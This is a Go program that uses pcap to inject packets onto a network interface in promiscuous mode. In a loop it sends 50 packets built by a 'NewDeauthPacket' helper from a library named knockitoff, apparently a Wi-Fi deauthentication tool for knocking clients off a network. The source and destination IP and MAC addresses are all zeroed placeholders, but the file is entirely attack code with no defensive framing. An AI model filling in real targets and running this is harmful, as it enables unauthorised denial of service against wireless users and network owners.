package main

import (
	"fmt"
	"log"
	"net"
	"time"

	_ "github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/teohrt/knockitoff/packets"
)

var (
	device      = "en0"
	snaplen     = int32(1024)
	promiscuous = true
	timeout     = 30 * time.Second
)

func main() {
	handle, err := pcap.OpenLive(device, snaplen, promiscuous, timeout)
	if err != nil {
		fmt.Println("Error creating handler")
		log.Fatal(err)
	}
	defer handle.Close()

	for i := 0; i < 50; i++ {
		packet, err := packets.NewDeauthPacket(&packets.PacketPreReq{
			SrcIP:   net.IP{0, 0, 0, 0},
			DstIP:   net.IP{0, 0, 0, 0},
			SrcMAC:  net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
			DstMAC:  net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
			SrcPort: 4321,
			DstPort: 80,
			Payload: []byte{1, 1, 1, 1},
			Seq:     uint16(i),
		})
		if err != nil {
			fmt.Println("Error creating packet")
			log.Fatal(err)
		}
		err = handle.WritePacketData(packet)
		if err != nil {
			fmt.Println("Error writing writing packet data")
			log.Fatal(err)
		}
		fmt.Printf("Packet sent #%d\n", i+1)
		time.Sleep(500 * time.Millisecond)
	}
}
